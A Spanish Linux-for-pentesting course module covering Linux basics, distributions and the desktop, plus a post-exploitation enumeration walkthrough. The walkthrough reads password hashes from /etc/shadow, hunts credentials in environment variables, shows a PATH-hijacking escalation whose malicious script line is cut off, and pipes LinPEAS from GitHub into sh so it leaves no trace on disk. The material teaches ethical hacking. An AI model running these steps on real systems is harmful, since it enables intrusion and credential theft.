---
title: "🐧 Curso de Linux — Módulo 1: Introducción, Arquitectura y Entorno"
aliases:
  - Linux Introduccion
  - Linux Entorno y WSL
  - Arquitectura Linux
tags:
  - ifct0109/pocs
  - linux
  - introduccion
  - wsl
  - docker
  - kali
---

# 🐧 Curso de Linux — Módulo 1: Introducción, Arquitectura y Preparación del Entorno

> [!abstract] Resumen del Módulo
> Este módulo introduce los cimientos conceptuales e históricos de GNU/Linux, su arquitectura interna (Kernel, Shell, Filesystem), las distribuciones clave orientadas a seguridad ofensiva (Kali Linux, Parrot OS, BlackArch) y las guías prácticas para desplegar un laboratorio de pruebas mediante **WSL (Windows Subsystem for Linux)** o contenedores **Docker**.

---

## 🏛️ Parte 1: Fundamentos y Arquitectura de Linux

# Curso de Linux para Pentesting

Módulo Introducción a Linux

  ← Volver al Índice

## 🐧 ¿Qué es Linux?

Linux es un **sistema operativo de código abierto** basado en Unix, creado en 1991 por **Linus Torvalds**. A diferencia de Windows o macOS, Linux es:

* ✅ Gratuito y de código abierto - Puedes ver, modificar y distribuir su código

* ✅ Multiusuario - Varios usuarios pueden trabajar simultáneamente

* ✅ Multitarea - Ejecuta múltiples procesos a la vez eficientemente

* ✅ Seguro y estable - Sistema de permisos robusto, menos vulnerable a virus

* ✅ Flexible y personalizable - Control total sobre el sistema

* ✅ Potente línea de comandos - Automatización y control preciso

> [!warning] 🎯 ¿Por qué Linux para Pentesting?
>        Linux es el sistema operativo preferido por profesionales de ciberseguridad porque:
>
>          🔧  Herramientas nativas  - La mayoría de herramientas de hacking están diseñadas para Linux
>          🎛️  Control total del sistema  - Acceso completo a nivel de kernel
>          📦  Fácil instalación de herramientas  - Repositorios especializados (Kali, Parrot)
>          🔒  Privacidad y anonimato  - Sin telemetría ni backdoors corporativas
>          💻  Eficiencia de recursos  - Funciona en hardware antiguo o limitado
>          🌐  Networking avanzado  - Control total de interfaces de red

## 📜 Breve Historia de Linux

#### 1969 - Unix

Bell Labs crea Unix, el sistema que inspiraría a Linux. Unix se convierte en el estándar para sistemas operativos robustos.

#### 1983 - Proyecto GNU

Richard Stallman inicia el proyecto GNU (GNU's Not Unix) para crear un sistema operativo completamente libre. Desarrolla herramientas esenciales pero falta el núcleo (kernel).

#### 1991 - Nace Linux

Linus Torvalds, estudiante finlandés de 21 años, crea el kernel Linux como proyecto personal. Lo libera bajo licencia GPL.

#### 1993 - Primera Distribución Seria

Slackware y Debian se convierten en las primeras distribuciones estables. GNU/Linux empieza a ser viable para uso real.

#### 2000s - Explosión de Distros

Surgen Ubuntu (2004), Fedora, CentOS. Linux se populariza en servidores web y empresas.

#### 2013 - Kali Linux

Offensive Security lanza Kali Linux (sucesor de BackTrack), la distribución definitiva para pentesting con más de 600 herramientas preinstaladas.

#### Actualidad

Linux domina servidores (~96% de los top 1M sitios web), supercomputadoras (100%), Android (sistema móvil más usado), IoT, y es esencial en ciberseguridad.

## 🎨 Distribuciones de Linux

Una **distribución (distro)** es Linux empaquetado con software adicional, herramientas y configuraciones específicas. Hay cientos de distribuciones, cada una para necesidades diferentes.

### 🔐 Distribuciones para Pentesting

#### 🐉 Kali Linux

**La #1 para pentesting**

* Basada en Debian

* 600+ herramientas preinstaladas

* Mantenida por Offensive Security

* Rolling release (siempre actualizada)

* Ideal para auditorías, CTFs, red teams

**Herramientas destacadas:** Metasploit, Nmap, Burp Suite, Wireshark, John, Hydra, SQLmap, Aircrack-ng

#### 🦜 Parrot Security OS

**Alternativa ligera a Kali**

* Basada en Debian

* Consume menos recursos que Kali

* Enfocada en privacidad y anonimato

* Herramientas de pentesting + forense

* Interfaz más amigable para principiantes

**Ventaja:** Funciona bien en hardware antiguo o VMs con pocos recursos

#### ⚫ BlackArch Linux

**La más completa**

* Basada en Arch Linux

* 2800+ herramientas de seguridad

* Rolling release bleeding edge

* Para usuarios avanzados

* Repositorio independiente de herramientas

**Nota:** Curva de aprendizaje alta, requiere conocimiento de Arch

### 💼 Distribuciones de Uso General

#### 🌀 Debian

**La base de todo, estable y confiable**

* Una de las distribuciones más antiguas (1993)

* Base de Ubuntu, Kali, Parrot y cientos más

* Extremadamente estable y segura

* Perfecta para servidores y producción

* Tres ramas: Stable, Testing, Unstable

**Nota:** Si aprendes Debian, entiendes la mayoría de distros Linux

#### 🟠 Ubuntu

**La más popular y amigable**

* Basada en Debian

* Fácil de usar para principiantes

* Enorme comunidad y documentación

* Versiones LTS (soporte 5 años)

* Puedes instalar herramientas manualmente

**Ideal para:** Aprender Linux antes de saltar a Kali

#### 🔴 Fedora

**Innovación y tecnología reciente**

* Patrocinada por Red Hat

* Tecnologías de vanguardia

* Muy segura por defecto (SELinux)

* Base para RHEL (empresarial)

* Actualizaciones frecuentes

#### 🍃 Linux Mint

**La más amigable para nuevos usuarios**

* Basada en Ubuntu/Debian

* Interfaz Cinnamon muy intuitiva

* Ideal para transición desde Windows

* Multimedia funcionando desde instalación

* Menos recursos que Ubuntu

**Ideal para:** Primera experiencia con Linux, uso de escritorio diario

#### 🎮 Bazzite

**Gaming en Linux llevado al extremo**

* Basada en Fedora Atomic (inmutable)

* Optimizada específicamente para gaming

* Steam, Lutris, Proton preconfigurados

* Soporte nativo para Steam Deck y handhelds

* Drivers GPU y herramientas gaming incluidas

**Ideal para:** Gamers que quieren la mejor experiencia de juego en Linux

#### 🚀 CachyOS

**Rendimiento extremo y optimización**

* Basada en Arch Linux

* Kernel optimizado para máximo rendimiento

* Compilaciones con optimizaciones avanzadas

* Repositorios propios más rápidos

* Varias versiones de kernel (bore, cachyos, linux-zen)

**Ideal para:** Hardware moderno que busca exprimir al máximo el rendimiento

> [!warning] 💡 ¿Cuál elegir?
>
>          🎯  Principiante absoluto en Linux  → Linux Mint (más amigable que Ubuntu)
>          🎯  Principiante técnico  → Ubuntu (gran comunidad y documentación)
>          🎯  Quiero estabilidad máxima  → Debian Stable
>          🎯  Quiero empezar pentesting YA  → Kali Linux
>          🎯  Hardware limitado  → Parrot Security OS o Linux Mint XFCE
>          🎯  Quiero aprender Linux a fondo  → Arch Linux + herramientas manuales
>          🎯  Todas las herramientas posibles  → BlackArch
>          🎯  Servidor en producción  → Debian Stable o Ubuntu LTS

## 🏗️ Arquitectura Básica de Linux

```bash
┌─────────────────────────────────────────┐
│        APLICACIONES DE USUARIO          │
│   (Firefox, Terminal, Metasploit)       │
├─────────────────────────────────────────┤
│            SHELL (bash, zsh)            │
│     Interfaz entre usuario y sistema    │
├─────────────────────────────────────────┤
│     UTILIDADES GNU (coreutils)          │
│   (ls, grep, cat, chmod, cp, mv...)     │
├─────────────────────────────────────────┤
│          LIBRERÍAS DEL SISTEMA          │
│       (glibc, OpenSSL, GTK, Qt)         │
├─────────────────────────────────────────┤
│         KERNEL LINUX (núcleo)           │
│  Gestiona hardware, memoria, procesos   │
├─────────────────────────────────────────┤
│            HARDWARE                     │
│   (CPU, RAM, Disco, Red, GPU...)        │
└─────────────────────────────────────────┘
```

### 🔑 Componentes Clave

#### 1. Kernel (Núcleo)

El corazón del sistema operativo. Gestiona:

* Procesos y multitarea

* Memoria RAM

* Drivers de hardware

* Sistema de archivos

* Comunicación entre aplicaciones y hardware

# Ver versión del kernel:
tecnico@linux:~$ uname -r
6.8.0-kali1-amd64

# Información completa del sistema:
tecnico@linux:~$ uname -a
Linux kali 6.8.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.8.11-1kali2 x86_64 GNU/Linux

#### 2. Shell (Intérprete de Comandos)

Interfaz entre el usuario y el kernel. Los más comunes:

* Bash (Bourne Again Shell) - El estándar, usado en el 90% de distros

* Zsh (Z Shell) - Bash mejorado con autocompletado inteligente

* Fish - Muy amigable para principiantes

* Sh - Shell POSIX básico, compatible universalmente

# Ver qué shell estás usando:
tecnico@linux:~$ echo $SHELL
/bin/bash

# Ver todos los shells disponibles:
tecnico@linux:~$ cat /etc/shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/sh
/bin/dash
/usr/bin/dash
/usr/bin/zsh

#### 3. Sistema de Archivos

Todo en Linux es un archivo (incluidos dispositivos y procesos). La estructura estándar:

/                    Raíz del sistema
├── bin/             Binarios esenciales del sistema (ls, cat, cp)
├── boot/            Archivos de arranque (kernel, GRUB)
├── dev/             Dispositivos (discos, USB, terminales)
├── etc/             Archivos de configuración del sistema
├── home/            Directorios personales de usuarios
│   └── tecnico/     Tu directorio personal
├── lib/             Librerías compartidas del sistema
├── media/           Puntos de montaje para USB, CDs
├── mnt/             Montajes temporales
├── opt/             Software adicional
├── proc/            Información de procesos (virtual)
├── root/            Directorio personal del superusuario
├── sbin/            Binarios de administración del sistema
├── srv/             Datos de servicios (web, FTP)
├── sys/             Información del sistema (virtual)
├── tmp/             Archivos temporales
├── usr/             Programas y librerías de usuario
│   ├── bin/         Binarios de usuario
│   ├── lib/         Librerías adicionales
│   └── local/       Software instalado localmente
└── var/             Datos variables (logs, cache, correo)

## 🖥️ Interfaces: GUI vs CLI

### GUI (Graphical User Interface) - Interfaz Gráfica

Linux ofrece varios entornos de escritorio:

* GNOME - Moderno y minimalista (Ubuntu por defecto)

* KDE Plasma - Muy personalizable, similar a Windows

* XFCE - Ligero y rápido (Kali por defecto)

* Cinnamon - Elegante, basado en GNOME (Linux Mint)

* i3/Openbox - Minimalistas, basados en teclado

**Ventaja:** Intuitivo, fácil para principiantes

**Desventaja:** Consume más recursos, menos eficiente para tareas automatizadas

### CLI (Command Line Interface) - Línea de Comandos

Terminal/consola donde escribes comandos de texto.

**Ventajas:**

* ⚡ Velocidad - Realizar tareas complejas en segundos

* 🔄 Automatización - Scripts para tareas repetitivas

* 🎯 Precisión - Control exacto sobre cada acción

* 📡 Acceso remoto - SSH para controlar máquinas a distancia

* 💾 Eficiencia - Consume mínimos recursos

* 🔧 Potencia - Acceso a funciones que la GUI no expone

**En pentesting, la CLI es ESENCIAL:**

* La mayoría de herramientas son de línea de comandos

* Servidores no tienen interfaz gráfica

* Shells remotas solo dan acceso a terminal

* Scripts de automatización y exploits se ejecutan en CLI

> [!warning] 🎯 Objetivo de Este Curso
>        Aunque Linux tiene interfaces gráficas, este curso se enfoca en la  línea de comandos  porque:
>
>          Es donde reside el verdadero poder de Linux
>          Es imprescindible para pentesting
>          Una vez dominas la CLI, la GUI es trivial
>          Te permite trabajar en cualquier entorno (servidores, embedded, IoT)

## 🎓 Conceptos Fundamentales

#### Usuario Root (Superusuario)

El administrador del sistema con permisos totales.

* Puede hacer cualquier cosa en el sistema

* UID (User ID) = 0

* Su directorio personal es `/root` (no `/home/root`)

* Peligro: Un error como root puede destruir el sistema

# Símbolo del prompt indica el tipo de usuario:
tecnico@linux:~$ # Usuario normal ($ al final)
root@linux:~# # Usuario root (# al final)

# Ver tu usuario actual:
tecnico@linux:~$ whoami
tecnico

# Ver tu UID:
tecnico@linux:~$ id -u
1000

# Como root:
root@linux:~# whoami
root
root@linux:~# id -u
0

#### sudo (Super User DO)

Ejecuta un comando con privilegios de root sin convertirte en root.

# Leer un archivo protegido (sin sudo - falla):
tecnico@linux:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Con sudo - funciona:
tecnico@linux:~$ sudo cat /etc/shadow
[sudo] password for tecnico: ****
root:$6$xyz123...:19752:0:99999:7:::
daemon:*:19752:0:99999:7:::
...

# Convertirse temporalmente en root:
tecnico@linux:~$ sudo -i
root@linux:~# # Ahora eres root
root@linux:~# exit
tecnico@linux:~$ # Vuelves a ser usuario normal

> [!warning] ⚠️ Buenas Prácticas con sudo
>
>            Usa `sudo` solo cuando sea necesario
>            NUNCA hagas `sudo rm -rf /` u operaciones destructivas sin revisar
>            Prefiere `sudo comando` a convertirte en root permanentemente
>            En Kali Linux puedes trabajar como root, pero es mala práctica en producción

#### Case Sensitivity (Sensible a Mayúsculas)

Linux distingue entre mayúsculas y minúsculas en TODO:

# Estos son tres archivos DIFERENTES:
tecnico@linux:~$ touch archivo.txt Archivo.txt ARCHIVO.txt
tecnico@linux:~$ ls
archivo.txt  Archivo.txt  ARCHIVO.txt

# Los comandos también son case-sensitive:
tecnico@linux:~$ ls
archivo.txt
tecnico@linux:~$ LS
bash: LS: command not found

#### Rutas Absolutas vs Relativas

# Ruta ABSOLUTA - desde la raíz (/):
tecnico@linux:~$ ls /home/tecnico/Documentos
# Funciona desde cualquier lugar del sistema

# Ruta RELATIVA - desde donde estás:
tecnico@linux:~$ pwd
/home/tecnico
tecnico@linux:~$ ls Documentos
# Solo funciona si estás en /home/tecnico

# Símbolos especiales:
#   .   = directorio actual
#   ..  = directorio padre
#   ~   = tu directorio home (/home/tecnico)
#   /   = raíz del sistema

tecnico@linux:~$ cd ..
tecnico@linux:/home$ pwd
/home

tecnico@linux:/home$ cd ~
tecnico@linux:~$ pwd
/home/tecnico

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

A continuación encontrarás técnicas de reconocimiento del sistema, enumeración básica y fingerprinting que son fundamentales en la fase de post-explotación.

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Técnicas de Pentesting - Reconocimiento del Sistema

      🔍 Reconocimiento Básico del Sistema (Post-Explotación)

#### Escenario: Has comprometido un sistema Linux

Tras obtener acceso inicial (reverse shell, credenciales comprometidas), el primer paso es **enumerar el sistema** para entender dónde estás y planificar la escalada de privilegios.

#### 🎯 Información del Sistema Operativo

# ¿Qué distribución es?
usuario@target:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"

# Versión del kernel (importante para exploits):
usuario@target:~$ uname -a
Linux target 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux

# Información de arquitectura:
usuario@target:~$ uname -m
x86_64

# Hostname del sistema:
usuario@target:~$ hostname
target.empresa.com

# Tiempo de actividad (uptime):
usuario@target:~$ uptime
14:23:01 up 45 days,  3:12,  2 users,  load average: 0.52, 0.48, 0.51
# Sistema con 45 días sin reiniciar = posiblemente sin parches

#### 👤 Información del Usuario Actual

# ¿Quién soy?
usuario@target:~$ whoami
www-data

# ¿Qué privilegios tengo?
usuario@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# ¿Puedo usar sudo?
usuario@target:~$ sudo -l
[sudo] password for www-data:
Sorry, user www-data may not run sudo on target.

# ¿Quién más ha iniciado sesión?
usuario@target:~$ w
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
admin    pts/0    10.10.10.5       14:05    0.00s  0.12s  0.01s w
root     pts/1    192.168.1.100    13:45    15:00  0.05s  0.05s -bash
# ¡Hay un admin conectado!

#### 💾 Recursos del Sistema

# Memoria RAM disponible:
usuario@target:~$ free -h
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       2.1Gi       0.5Gi       156Mi       1.2Gi       1.3Gi
Swap:         2.0Gi       512Mi       1.5Gi

# Espacio en disco:
usuario@target:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   42G  5.2G  90% /
/dev/sdb1       100G   85G   15G  86% /var/backups
# /var/backups tiene 15GB = puede tener backups interesantes

# CPUs disponibles:
usuario@target:~$ lscpu | grep "^CPU(s)"
CPU(s):                  4

#### 🎯 ¿Por qué es Importante?

* 📌 Kernel antiguo → Buscar exploits públicos (searchsploit, exploit-db)

* 📌 Usuario con bajos privilegios → Necesitas escalar privilegios

* 📌 Sistema sin reiniciar en meses → Sin parches de seguridad aplicados

* 📌 Otros usuarios conectados → Posible hijacking de sesiones

      👥 Enumeración de Usuarios y Grupos

#### Vector de Ataque: Descubrir Usuarios

Conocer qué usuarios existen, sus privilegios y configuraciones ayuda a planificar la escalada de privilegios o movimiento lateral.

#### 📋 Listar Usuarios del Sistema

# Ver todos los usuarios (humanos y del sistema):
usuario@target:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
tecnico:x:1001:1001:Tecnico:/home/tecnico:/bin/bash
mysql:x:108:113:MySQL Server:/var/lib/mysql:/bin/false

# Extraer solo usuarios humanos (UID >= 1000):
usuario@target:~$ awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd
admin
tecnico

# Ver usuarios con shell válida (pueden iniciar sesión):
usuario@target:~$ grep -E '/bin/(bash|sh|zsh)' /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
tecnico:x:1001:1001:Tecnico:/home/tecnico:/bin/bash

#### 🔐 Intentar Leer /etc/shadow (Hashes de Contraseñas)

# Normalmente solo root puede leerlo:
usuario@target:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Pero si hay una mala configuración...
usuario@target:~$ ls -l /etc/shadow
-rw-r--r-- 1 root shadow 1234 Feb 6 10:00 /etc/shadow
# ¡Readable por todos! Podemos crackear contraseñas

usuario@target:~$ cat /etc/shadow
root:$6$xyz123...:19752:0:99999:7:::
admin:$6$abc456...:19850:0:99999:7:::
tecnico:$6$def789...:19851:0:99999:7:::
# Copiar estos hashes y usar John the Ripper o Hashcat

#### 👥 Grupos y Membresías

# Ver todos los grupos:
usuario@target:~$ cat /etc/group | head -10
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,admin
sudo:x:27:admin,tecnico
docker:x:999:admin

# ¿A qué grupos pertenezco?
usuario@target:~$ groups
www-data

# Grupos de otro usuario:
usuario@target:~$ groups admin
admin : admin sudo docker adm
# ¡admin está en el grupo docker! → Vector de escalada

#### 🎯 Grupos Peligrosos para Escalada de Privilegios

| Grupo | Riesgo | Explotación |
| --- | --- | --- |
| `sudo` | 🔴 Crítico | Puede ejecutar comandos como root |
| `docker` | 🔴 Crítico | Crear contenedor con root en el host |
| `lxd` | 🔴 Crítico | Similar a docker, contenedores privilegiados |
| `disk` | 🔴 Crítico | Acceso directo a discos (leer /etc/shadow) |
| `adm` | 🟠 Alto | Leer logs del sistema (/var/log) |
| `shadow` | 🟠 Alto | Leer /etc/shadow |

      ⚙️ Enumeración de Procesos y Servicios

#### Vector de Ataque: Procesos en Ejecución

Los procesos activos revelan servicios, aplicaciones vulnerables y posibles vectores de escalada.

#### 🔍 Listar Procesos Activos

# Ver todos los procesos:
usuario@target:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169564 11740 ?        Ss   10:00   0:01 /sbin/init
root       456  0.0  0.2  72296  6012 ?        Ss   10:00   0:00 /usr/sbin/sshd
mysql      789  0.5  5.2 1234567 123456 ?      Ssl  10:01   2:34 /usr/sbin/mysqld
root      1234  0.0  0.1  12345  3456 ?        S    14:00   0:00 /bin/sh /opt/backup.sh

# Procesos ejecutados por root (posibles escaladas):
usuario@target:~$ ps aux | grep ^root
root      1234  0.0  0.1  12345  3456 ?  S  14:00  0:00 /bin/sh /opt/backup.sh
# ¿Es /opt/backup.sh modificable? → Escalada de privilegios

# Procesos escuchando en red:
usuario@target:~$ netstat -tulnp
Proto Recv-Q Send-Q Local Address   Foreign Address   State       PID/Program name
tcp        0      0 0.0.0.0:22      0.0.0.0:*         LISTEN      456/sshd
tcp        0      0 127.0.0.1:3306  0.0.0.0:*         LISTEN      789/mysqld
tcp        0      0 0.0.0.0:80      0.0.0.0:*         LISTEN      890/apache2
# MySQL escuchando solo en localhost (127.0.0.1)

#### 🔧 Servicios del Sistema

# Listar servicios activos (systemd):
usuario@target:~$ systemctl list-units --type=service --state=running
UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
ssh.service              loaded active running OpenBSD Secure Shell server
mysql.service            loaded active running MySQL Community Server
apache2.service          loaded active running The Apache HTTP Server
cron.service             loaded active running Regular background program

# Ver configuración de un servicio:
usuario@target:~$ systemctl status apache2
● apache2.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/apache2.service)
   Active: active (running) since Mon 2025-02-03 10:00:00
   Main PID: 890 (apache2)

# Servicios habilitados al inicio:
usuario@target:~$ systemctl list-unit-files --state=enabled

#### 📊 Conexiones de Red Activas

# Ver conexiones establecidas:
usuario@target:~$ ss -tuln
State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22            0.0.0.0:*
LISTEN   0        80       127.0.0.1:3306        0.0.0.0:*
ESTAB    0        0        192.168.1.100:22      10.10.10.5:54321
# Conexión SSH activa desde 10.10.10.5

# Ver conexiones con nombres de programas (requiere privilegios):
usuario@target:~$ sudo ss -tulnp

      🌍 Variables de Entorno y PATH

#### Vector de Ataque: Variables de Entorno

Las variables de entorno pueden revelar información sensible (credenciales, rutas) y son explotables para PATH hijacking.

#### 🔍 Enumerar Variables de Entorno

# Ver todas las variables:
usuario@target:~$ env
USER=www-data
HOME=/var/www
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SHELL=/bin/bash
PWD=/var/www/html
LANG=en_US.UTF-8
DB_PASSWORD=SuperSecret123!
# ¡Contraseña de base de datos en variable de entorno!

# Ver una variable específica:
usuario@target:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Variables interesantes para buscar:
usuario@target:~$ env | grep -i pass
DB_PASSWORD=SuperSecret123!
MYSQL_PWD=OtraPass456

usuario@target:~$ env | grep -i key
API_KEY=abcd1234efgh5678
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

#### ⚡ Explotación: PATH Hijacking

# Si un script ejecutado por root usa comandos sin ruta absoluta:
usuario@target:~$ cat /opt/backup.sh
#!/bin/bash
tar -czf /backup/data.tar.gz /var/www/html
# Usa "tar" sin ruta completa (/bin/tar)

# Y si el PATH tiene un directorio escribible primero:
usuario@target:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# ¡/tmp está PRIMERO en PATH!

# Crear un "tar" malicioso:
usuario@target:~$ cat > /tmp/tar usuario@target:~$ chmod +x /tmp/tar

# Cuando root ejecute backup.sh, usará NUESTRO tar:
# → Shell de root

#### 🎯 Variables Críticas para Revisar

* `PATH` - Directorios donde se buscan comandos

* `LD_PRELOAD` / `LD_LIBRARY_PATH` - Carga de librerías (explotable)

* `HOME` - Directorio personal del usuario

* `USER` / `LOGNAME` - Usuario actual

* Variables con PASS, KEY, TOKEN, SECRET - Credenciales

      🤖 Scripts de Enumeración Automatizada

#### Automatización del Reconocimiento

Scripts que automatizan la enumeración del sistema para encontrar vectores de escalada de privilegios.

#### 🔧 Herramientas de Enumeración Populares

#### LinPEAS (Linux Privilege Escalation Awesome Script)

El más completo y actualizado. Busca todo: SUID, capabilities, cron jobs, servicios, etc.

# Descargar y ejecutar (en máquina comprometida):
usuario@target:~$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
usuario@target:~$ chmod +x linpeas.sh
usuario@target:~$ ./linpeas.sh

# O ejecutar directamente desde memoria (sin dejar rastro en disco):
usuario@target:~$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Guardar output para análisis:
usuario@target:~$ ./linpeas.sh | tee linpeas_output.txt

#### LinEnum

Script bash simple y efectivo para enumeración básica.

usuario@target:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
usuario@target:~$ chmod +x LinEnum.sh
usuario@target:~$ ./LinEnum.sh -t -r enum_report.txt
# -t = thorough (exhaustivo), -r = export report

#### Linux Smart Enumeration (lse.sh)

Enumeración con niveles de detalle configurables.

usuario@target:~$ wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
usuario@target:~$ chmod +x lse.sh

# Nivel 0 - Rápido (solo lo más importante):
usuario@target:~$ ./lse.sh -l 0

# Nivel 1 - Interesante (recomendado):
usuario@target:~$ ./lse.sh -l 1

# Nivel 2 - Todo:
usuario@target:~$ ./lse.sh -l 2

#### 📋 Qué Buscan Estos Scripts

* ✅ Binarios SUID/SGID explotables

* ✅ Capabilities peligrosas

* ✅ Cron jobs manipulables

* ✅ Archivos escribibles en PATH

* ✅ Configuraciones de sudo

* ✅ Servicios vulnerables

* ✅ Kernel exploits conocidos

* ✅ Archivos de configuración con credenciales

* ✅ Historiales de bash con comandos sensibles

* ✅ Conexiones de red sospechosas

> [!warning] ⚠️ Importante
>            Estos scripts generan MUCHO output. Revisa cuidadosamente las secciones marcadas en  ROJO  o  AMARILLO  - son los hallazgos más críticos.

  ← Volver al Índice

Módulo Introducción a Linux - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🖥️ Parte 2: El Entorno Gráfico (GUI vs CLI)

# Módulo - Entorno Gráfico

Introducción al entorno de escritorio Linux

  ← Volver al Índice

## 🖥️ Introducción al Entorno Gráfico

> [!warning] 💡 Nota Importante
>        Este módulo es una  introducción ligera  al entorno gráfico de Linux. Aunque es útil conocer las herramientas visuales, en el mundo del pentesting y hacking ético  la terminal es tu mejor amiga .
>        La mayoría de los servidores Linux no tienen entorno gráfico instalado, y las herramientas profesionales se usan desde la línea de comandos. Por eso, este módulo será breve y a partir del Módulo 3 nos centraremos 100% en la terminal.

### 🎨 ¿Qué es un Entorno de Escritorio?

El **entorno de escritorio** (Desktop Environment o DE) es la interfaz gráfica que te permite interactuar con Linux usando ventanas, iconos, menús y el ratón, similar a Windows o macOS.

**Los más populares en Linux:**

* GNOME - Moderno, elegante (usado por Ubuntu, Fedora, Debian)

* KDE Plasma - Muy personalizable, similar a Windows

* XFCE - Ligero y rápido (usado por Kali Linux por defecto)

* Cinnamon - Tradicional, fácil de usar (Linux Mint)

* MATE - Clásico, basado en GNOME 2

> [!warning] 🐉 Kali Linux y XFCE
>          Kali Linux usa  XFCE  por defecto porque es ligero, rápido y consume pocos recursos, lo cual es perfecto para máquinas virtuales y equipos de pentesting donde necesitas rendimiento para las herramientas, no para el escritorio.

## 🔧 Aplicaciones del Entorno Gráfico

### 📱 Aplicaciones Básicas del Sistema

#### 📁 Explorador de Archivos

**Thunar** (XFCE), **Nautilus** (GNOME), **Dolphin** (KDE)

Navega visualmente por tu sistema de archivos, copia, mueve y gestiona archivos con el ratón.

#### 🌐 Navegador Web

**Firefox ESR** (Kali Linux por defecto)

Navegador web con herramientas de desarrollo integradas, extensiones para pentesting.

#### 🖊️ Editor de Texto

**Mousepad**, **gedit**, **Kate**

Editores de texto con interfaz gráfica para editar archivos de configuración, scripts, etc.

#### 💻 Terminal Emulator

**XFCE Terminal**, **GNOME Terminal**, **Konsole**

La aplicación más importante: te da acceso a la línea de comandos.

#### 📊 Monitor del Sistema

**Task Manager**, **System Monitor**

Visualiza procesos en ejecución, uso de CPU, RAM, red. Equivalente al "Administrador de Tareas" de Windows.

#### ⚙️ Configuración

**Settings Manager**, **System Settings**

Panel de control para configurar temas, apariencia, red, pantalla, teclado, etc.

### 🎨 Personalización del Escritorio

Puedes personalizar tu entorno gráfico para hacerlo más cómodo:

* Temas visuales: Cambia colores, iconos, fondos de pantalla

* Panel/Barra de tareas: Añade o quita widgets, cambia posición

* Atajos de teclado: Configura teclas rápidas para aplicaciones

* Fuentes y tamaños: Ajusta legibilidad según tu pantalla

* Efectos visuales: Transparencias, animaciones (aunque consumen recursos)

> [!warning] 💡 Recomendación para Pentesting
>          Si trabajas con Kali Linux en una VM,  mantén la personalización al mínimo . Un entorno simple y ligero te deja más recursos (CPU/RAM) para las herramientas de pentesting que realmente importan.

## 🖥️ Administración del Sistema (GUI)

### 📊 Monitor del Sistema / Task Manager

El monitor del sistema te muestra información en tiempo real:

* Procesos en ejecución: Qué programas están corriendo

* Uso de CPU: Qué procesos consumen más procesador

* Uso de RAM: Memoria utilizada vs disponible

* Red: Tráfico de subida/bajada

* Disco: Lectura/escritura, espacio disponible

> [!warning] ⚠️ Importante
>          Aunque puedes hacer esto desde la interfaz gráfica, en pentesting usarás comandos como `htop`, `ps`, `top`, `netstat` desde la terminal para tener más control y detalle.

### 🎛️ Panel de Control / Configuración

Desde el panel de configuración puedes ajustar:

#### 🖥️ Pantalla

Resolución, múltiples monitores, orientación, frecuencia de refresco.

#### 🌐 Red

Conectar a WiFi, configurar IP estática, DNS, VPN. (Más adelante usaremos comandos para esto)

#### ⌨️ Teclado y Ratón

Distribución del teclado, velocidad del ratón, atajos de teclado.

#### 🔊 Sonido

Volumen, dispositivos de entrada/salida de audio.

#### 👤 Usuarios y Grupos

Gestión visual de usuarios (aunque lo haremos desde terminal en el Módulo 8).

#### 🔐 Energía

Suspensión, apagado de pantalla, modo ahorro de energía.

## 🌐 Gestión de Red desde la GUI

### 📡 Network Manager

La mayoría de distribuciones Linux modernas usan **Network Manager** para gestionar la red desde la interfaz gráfica.

**Desde el icono de red en la barra de tareas puedes:**

* ✅ Conectarte a redes WiFi disponibles

* ✅ Ver tu dirección IP actual

* ✅ Configurar una IP estática

* ✅ Cambiar servidores DNS

* ✅ Configurar VPNs

* ✅ Activar/desactivar interfaces de red

> [!warning] 🎯 En Pentesting
>          Aunque puedes hacer esto desde la GUI, en el  Módulo 6 (Comandos de Red)  aprenderás a hacerlo desde la terminal con comandos como `ifconfig`, `ip`, `nmcli`, etc.
>           ¿Por qué?  En un test de penetración real, muchas veces no tendrás acceso a entorno gráfico, solo a terminal SSH.

## 📁 Explorador de Archivos

### 🗂️ Navegación Visual del Sistema

El explorador de archivos te permite navegar por el sistema de archivos de forma visual, similar al "Explorador de Windows".

**Funciones básicas:**

* 📂 Navegar por directorios (carpetas)

* 📄 Crear, copiar, mover, eliminar archivos y carpetas

